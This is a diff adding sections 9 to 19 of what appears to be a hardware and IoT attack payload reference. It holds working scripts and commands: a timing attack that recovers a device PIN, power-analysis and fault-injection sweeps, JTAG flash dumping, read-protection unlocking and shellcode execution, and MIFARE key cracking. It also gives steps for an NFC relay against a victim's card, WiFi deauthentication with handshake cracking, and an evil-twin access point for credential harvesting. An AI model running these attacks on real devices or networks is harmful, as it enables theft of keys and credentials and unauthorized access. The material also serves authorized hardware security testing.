@@ -578,3 +578,564 @@ strings "$FIRMWARE_ROOT/bin/httpd" 2>/dev/null | grep -E 'GCC|clang|built|compil
 find "$FIRMWARE_ROOT" -name "libssl*" -o -name "libcrypto*" 2>/dev/null
 strings "$FIRMWARE_ROOT/usr/lib/libssl.so.1.0.0" 2>/dev/null | grep "OpenSSL" | head -5
 ```
+
+---
+
+## 9. Side-Channel Attack Payloads
+
+### Power Analysis Setup
+
+```python
+#!/usr/bin/env python3
+"""ChipWhisperer power trace capture for CPA attack on AES."""
+import chipwhisperer as cw
+import numpy as np
+
+scope = cw.scope()
+scope.default_setup()
+scope.adc.samples = 24000
+scope.adc.decimate = 1
+scope.glitch.clk_src = "clkgen"
+
+target = cw.target(scope, cw.targets.SimpleSerial)
+target.set_key(cw.ktp().next()[0])
+
+traces = []
+plaintexts = []
+ktp = cw.ktp.Basic()
+for i in range(500):
+    key, pt = ktp.next()
+    target.set_key(key)
+    scope.arm()
+    target.simpleserial_write("p", pt)
+    ret = scope.capture()
+    if ret:
+        continue
+    traces.append(scope.get_last_trace())
+    plaintexts.append(pt)
+
+np.save("traces.npy", np.array(traces))
+np.save("plaintexts.npy", np.array(plaintexts))
+print(f"Captured {len(traces)} traces for CPA analysis")
+```
+
+### Timing Side-Channel Testing
+
+```python
+#!/usr/bin/env python3
+"""Timing side-channel analysis for password/PIN comparison."""
+import statistics
+import time
+import requests
+
+TARGET_URL = "http://device.local/api/verify"
+PIN_LENGTH = 4
+
+def measure_timing(pin, samples=100):
+    times = []
+    for _ in range(samples):
+        start = time.perf_counter_ns()
+        requests.post(TARGET_URL, json={"pin": pin})
+        elapsed = time.perf_counter_ns() - start
+        times.append(elapsed)
+    return statistics.median(times)
+
+def timing_attack():
+    known = ""
+    for pos in range(PIN_LENGTH):
+        best_digit = "0"
+        best_time = 0
+        for digit in "0123456789":
+            test_pin = known + digit + "0" * (PIN_LENGTH - pos - 1)
+            t = measure_timing(test_pin)
+            if t > best_time:
+                best_time = t
+                best_digit = digit
+        known += best_digit
+        print(f"[+] Position {pos}: {best_digit}")
+    print(f"[+] Recovered PIN: {known}")
+    return known
+
+timing_attack()
+```
+
+---
+
+## 10. Fault Injection Payloads
+
+### Voltage Glitch Parameter Sweep
+
+```python
+#!/usr/bin/env python3
+"""ChipWhisperer voltage glitch parameter sweep."""
+import chipwhisperer as cw
+
+scope = cw.scope()
+scope.default_setup()
+target = cw.target(scope, cw.targets.SimpleSerial)
+
+scope.glitch.clk_src = "clkgen"
+scope.glitch.output = "glitch_only"
+scope.glitch.trigger_src = "ext_single"
+
+results = []
+for width in range(1, 40, 2):
+    for offset in range(-40, 40, 2):
+        scope.glitch.width = width
+        scope.glitch.offset = offset
+        scope.arm()
+        target.simpleserial_write("p", bytearray(16))
+        ret = scope.capture()
+        response = target.simpleserial_read("r", 16)
+        if response and response != bytearray(16):
+            print(f"[!] Fault: width={width} offset={offset}")
+            results.append((width, offset, response))
+
+print(f"Total faults found: {len(results)}")
+```
+
+### Laser Fault Injection Timing Script
+
+```python
+#!/usr/bin/env python3
+"""Coordinate laser fault injection with target execution."""
+import time
+import serial
+
+TARGET_SERIAL = "/dev/ttyUSB0"
+BAUD = 115200
+
+def laser_glitch_campaign():
+    target = serial.Serial(TARGET_SERIAL, BAUD, timeout=2)
+    for delay in range(40000, 50000, 100):
+        for width in range(5, 25, 1):
+            target.write(b"RUN_CRYPTO\n")
+            target.flush()
+            time.sleep(delay / 1e6)
+            response = target.read(64).decode(errors="replace")
+            if "FAULT" in response or len(response) == 0:
+                print(f"[!] GLITCH at delay={delay}us width={width}ns")
+    target.close()
+
+laser_glitch_campaign()
+```
+
+---
+
+## 11. JTAG Exploitation
+
+### JTAG Debug Shell Access
+
+```bash
+# Connect via OpenOCD and get debug shell on ARM target
+openocd -f interface/ftdi/olimex-arm-usb-ocd.cfg -f target/stm32f4x.cfg &
+sleep 2
+
+# Dump full flash memory via telnet
+echo "halt; dump_image /tmp/full_flash.bin 0x08000000 0x100000" | telnet localhost 4444
+
+# Read specific memory region (RAM containing decrypted data)
+echo "mdw 0x20000000 256" | telnet localhost 4444
+
+# Set PC to shellcode address and execute
+echo "reg pc 0x20000000; resume" | telnet localhost 4444
+```
+
+### JTAG Fuse Bypass
+
+```bash
+# STM32 option bytes read via OpenOCD
+echo "stm32f1x options_read 0" | telnet localhost 4444
+
+# Unlock read protection
+echo "stm32f1x unlock 0" | telnet localhost 4444
+
+# AVR fuse read via avrdude
+avrdude -c usbasp -p m328p -U lfuse:r:-:h -U hfuse:r:-:h -U efuse:r:-:h
+```
+
+---
+
+## 12. Firmware Extraction Techniques
+
+### In-Circuit SPI Flash Reading
+
+```bash
+# Read SPI flash chip without desoldering (in-circuit)
+flashrom -p ch341a_spi -r /tmp/in_circuit_dump.bin
+
+# Check for bus contention
+flashrom -p ch341a_spi -r /tmp/dump_2.bin
+diff <(xxd /tmp/in_circuit_dump.bin) <(xxd /tmp/dump_2.bin)
+
+# Slower speed if reads differ
+flashrom -p ch341a_spi:spispeed=128k -r /tmp/slow_dump.bin
+```
+
+### Memory Dump via GDB (JTAG/SWD)
+
+```bash
+# Connect GDB to OpenOCD debug server
+arm-none-eabi-gdb
+(gdb) target remote localhost:3333
+(gdb) monitor halt
+
+# Dump all flash memory
+(gdb) dump binary memory /tmp/flash_dump.bin 0x08000000 0x08100000
+
+# Dump RAM contents
+(gdb) dump binary memory /tmp/ram_dump.bin 0x20000000 0x20020000
+
+# Search for strings in memory
+(gdb) find 0x20000000, 0x20020000, "password"
+(gdb) find 0x20000000, 0x20020000, "secret"
+```
+
+---
+
+## 13. Hardware Debugging
+
+### SWD Debugging with OpenOCD
+
+```bash
+# Connect via SWD (2-wire debug, common on ARM Cortex-M)
+openocd -f interface/cmsis-dap.cfg -f target/stm32f1x.cfg -c "transport select hla_swd"
+
+# Set hardware breakpoint
+echo "bp 0x08001234 2 hw" | telnet localhost 4444
+
+# Watchpoint on memory address
+echo "wp 0x20000000 4 r" | telnet localhost 4444
+echo "wp 0x20000000 4 w" | telnet localhost 4444
+```
+
+### GDB Hardware Debug Workflow
+
+```bash
+# Full GDB hardware debugging session
+arm-none-eabi-gdb /tmp/firmware.elf
+(gdb) target remote :3333
+(gdb) monitor reset halt
+(gdb) break main
+(gdb) continue
+(gdb) print security_flag
+(gdb) set {int}0x20000004 = 1
+(gdb) continue
+```
+
+---
+
+## 14. IoT Security Testing
+
+### Zigbee Security Testing
+
+```bash
+# Scan for Zigbee networks
+zbstumbler -w /tmp/zigbee_scan.txt
+
+# Capture Zigbee traffic
+zbcapture -f 11 -w /tmp/zigbee_capture.pcap
+
+# Extract network key from captured join process
+zbkey /tmp/zigbee_capture.pcap
+
+# Replay captured Zigbee packets
+zbreplay -f /tmp/zigbee_capture.pcap -c 11
+```
+
+### BLE Testing
+
+```bash
+# BLE scanning and enumeration
+bettercap -eval "ble.recon on; ble.show"
+
+# GATT service enumeration
+gatttool -b XX:XX:XX:XX:XX:XX -I
+# [LE]> connect
+# [LE]> primary
+# [LE]> characteristics
+
+# Read all characteristics
+for handle in $(seq 1 100); do
+  gatttool -b XX:XX:XX:XX:XX:XX --char-read -a "0x$(printf '%04x' $handle)" 2>/dev/null
+done
+```
+
+### CAN Bus Testing
+
+```bash
+# Set up CAN interface
+ip link set can0 type can bitrate 500000
+ip link set up can0
+
+# Monitor all CAN traffic
+candump can0
+
+# Send test CAN frame
+cansend can0 123#DEADBEEF
+
+# Replay captured CAN traffic
+canplayer -I can_capture.log
+
+# Identify ECUs by arbitration ID
+candump can0 | awk '{print $3}' | sort -u
+```
+
+---
+
+## 15. Advanced Firmware Extraction
+
+### eMMC Dump via USB
+
+```bash
+# Extract firmware from eMMC storage via USB interface
+# Requires eMMC adapter or direct soldering
+
+# Identify eMMC device
+lsblk | grep -i mmc
+# Output: mmcblk0    179:0    0   7.3G     0 disk
+
+# Full disk dump
+dd if=/dev/mmcblk0 of=/tmp/emmc_dump.bin bs=4M status=progress
+
+# Dump specific boot partition
+dd if=/dev/mmcblk0boot0 of=/tmp/boot0.bin bs=4M status=progress
+dd if=/dev/mmcblk0boot1 of=/tmp/boot1.bin bs=4M status=progress
+
+# Verify dump integrity
+sha256sum /tmp/emmc_dump.bin /tmp/boot0.bin /tmp/boot1.bin
+```
+
+### NAND Flash Extraction
+
+```bash
+# NAND flash extraction using nanddump (OpenWrt/Linux)
+# First identify NAND device
+cat /proc/mtd
+# Output: dev:    size   erasesize  name
+# mtd0: 00040000 00020000 "u-boot"
+# mtd1: 00020000 00020000 "u-boot-env"
+
+# Dump individual MTD partitions
+nanddump -f /tmp/mtd0_uboot.bin /dev/mtd0
+nanddump -f /tmp/mtd1_env.bin /dev/mtd1
+nanddump -f /tmp/mtd2_kernel.bin /dev/mtd2
+nanddump -f /tmp/mtd3_rootfs.bin /dev/mtd3
+
+# Full NAND dump (including OOB data)
+nanddump -a -f /tmp/nand_full.bin /dev/mtd3
+
+# Extract JFFS2 from NAND dump
+jefferson /tmp/mtd3_rootfs.bin -d /tmp/rootfs/
+```
+
+---
+
+## 16. Hardware Debug Interface Scanning
+
+### Automatic Debug Port Discovery
+
+```bash
+#!/bin/bash
+# Scan a target board for common debug interfaces
+
+echo "[*] Scanning for debug interfaces..."
+
+# Check for UART devices
+echo "[UART] Checking serial devices..."
+ls -la /dev/ttyUSB* /dev/ttyACM* 2>/dev/null
+dmesg | grep -iE 'ttyUSB|ttyACM|cp210x|ch34|ftdi|pl2303' | tail -10
+
+# Check for JTAG adapters
+echo "[JTAG] Checking JTAG adapters..."
+lsusb | grep -iE 'ftdi|jtag|openocd|bus.pirate|stlink|j-link'
+ls -la /dev/ttyUSB* 2>/dev/null
+
+# Check for SWD devices
+echo "[SWD] Checking SWD/ST-Link..."
+lsusb | grep -iE 'stlink|cmsis|daplink'
+
+# Check for I2C buses
+echo "[I2C] Checking I2C buses..."
+ls /dev/i2c-* 2>/dev/null
+i2cdetect -l 2>/dev/null
+
+# Check for SPI devices
+echo "[SPI] Checking SPI devices..."
+ls /dev/spidev* 2>/dev/null
+
+# Scan for GPIO pins
+echo "[GPIO] Checking GPIO availability..."
+ls /sys/class/gpio/ 2>/dev/null
+```
+
+---
+
+## 17. Chip-Off Forensics Preparation
+
+### Chip Desoldering Commands
+
+```bash
+# After physical chip removal, connect via programmer for analysis
+
+# Read chip via programmer (after desoldering)
+flashrom -p ch341a_spi -r /tmp/desoldered_chip.bin
+flashrom -p ch341a_spi -r /tmp/desoldered_chip_verify.bin
+
+# Compare reads for bit-accuracy
+diff <(xxd /tmp/desoldered_chip.bin) <(xxd /tmp/desoldered_chip_verify.bin)
+
+# Scan for embedded filesystems
+binwalk /tmp/desoldered_chip.bin
+binwalk -e /tmp/desoldered_chip.bin
+
+# Extract and analyze strings
+strings -n 8 /tmp/desoldered_chip.bin | grep -iE '(password|key|secret|token|admin|root)' | head -30
+```
+
+### Memory Forensics on Embedded Devices
+
+```bash
+# Dump RAM contents from running embedded device via JTAG
+
+# ARM Cortex-M typical RAM range: 0x20000000 - 0x20020000 (128KB)
+echo "halt; dump_image /tmp/ram_dump.bin 0x20000000 0x20000; resume" | telnet localhost 4444
+
+# Search RAM for sensitive data
+strings /tmp/ram_dump.bin | grep -iE '(password|key|token|secret|session|cookie|auth)'
+
+# Search for crypto keys in RAM
+python3 -c "
+data = open('/tmp/ram_dump.bin', 'rb').read()
+for i in range(0, len(data) - 16, 4):
+    block = data[i:i+16]
+    unique_bytes = len(set(block))
+    if unique_bytes >= 14:
+        print(f'Potential key at offset 0x{i:08x}: {block.hex()}')
+" | head -20
+```
+
+### Power Analysis Countermeasures Testing
+
+```python
+#!/usr/bin/env python3
+"""Test if a device implements proper countermeasures against power analysis."""
+import chipwhisperer as cw
+import numpy as np
+
+scope = cw.scope()
+scope.default_setup()
+scope.adc.samples = 5000
+target = cw.target(scope, cw.targets.SimpleSerial)
+
+# Capture multiple traces with same input to check for randomization
+traces = []
+for _ in range(10):
+    scope.arm()
+    target.simpleserial_write("p", b"\x00" * 16)
+    scope.capture()
+    traces.append(scope.get_last_trace())
+
+# Check variance between traces
+traces_array = np.array(traces)
+variance = np.var(traces_array, axis=0)
+max_variance = np.max(variance)
+
+if max_variance < 0.01:
+    print("[WEAK] No randomization detected - vulnerable to power analysis")
+else:
+    print("[OK] Trace variance detected - possible masking/blinding countermeasure")
+```
+
+---
+
+## 18. RFID Advanced Attacks
+
+### MIFARE Classic Key Recovery
+
+```bash
+# In Proxmark3 client - MIFARE Classic key recovery
+
+# Step 1: Try default keys first
+hf mf autopwn
+
+# Step 2: If autopwn fails, try hardnested attack
+hf mf hardnested 0 A FFFFFFFFFFFF 4 A
+
+# Step 3: Darkside attack for unknown sector 0 key
+hf mf darkside
+
+# Step 4: Enumerate keys using known key
+hf mf chk -1k --keys hf mf dict/mf_classic_dict.bin
+
+# Step 5: Dump decrypted sectors
+hf mf dump --file /tmp/mf_dump --key-file /tmp/mf_keys.bin
+```
+
+### NFC Relay Attack Setup
+
+```bash
+# Proxmark3 relay attack - relay card data over network
+# Requires two Proxmark3 devices
+
+# Device 1 (near victim card):
+hf 14a relay --mode reader
+
+# Device 2 (near legitimate reader):
+hf 14a relay --mode tag
+
+# Simulate NFC tag from captured data
+hf 14a sim --type 1 --uid DEADBEEF
+hf mf sim --uid DEADBEEF --atqa 0004 --sak 08
+
+# Capture and replay NTAG215 (Amiibo, etc.)
+hf mf ndefread
+hf 14a raw -c 60 DEADBEEF01
+```
+
+---
+
+## 19. Embedded Wireless Testing
+
+### WiFi Deauth and Capture
+
+```bash
+# Put WiFi adapter in monitor mode
+airmon-ng check kill
+airmon-ng start wlan0
+airodump-ng wlan0mon
+
+# Capture handshake from target AP
+airodump-ng --bssid TARGET_AP_MAC -c 6 -w /tmp/handshake wlan0mon
+
+# Deauth to force reconnection and capture handshake
+aireplay-ng -0 5 -a TARGET_AP_MAC -c CLIENT_MAC wlan0mon
+
+# Verify captured handshake
+aircrack-ng /tmp/handshake-01.cap -w /usr/share/wordlists/rockyou.txt
+```
+
+### Evil Twin Setup
+
+```bash
+# Create rogue access point using hostapd-wpe
+cat > /tmp/hostapd.conf << 'EOF'
+interface=wlan0
+ssid=Target_Network
+channel=6
+hw_mode=g
+auth_algs=1
+wpa=2
+wpa_passphrase=CapturedPassword
+rsn_pairwise=CCMP
+EOF
+
+hostapd /tmp/hostapd.conf
+
+# Or use hostapd-wpe for credential harvesting
+hostapd-wpe /tmp/hostapd-wpe.conf
+
+# Capture WPA enterprise credentials
+# Set up RADIUS server to log MS-CHAPv2 challenges
+freeradius -X
+```
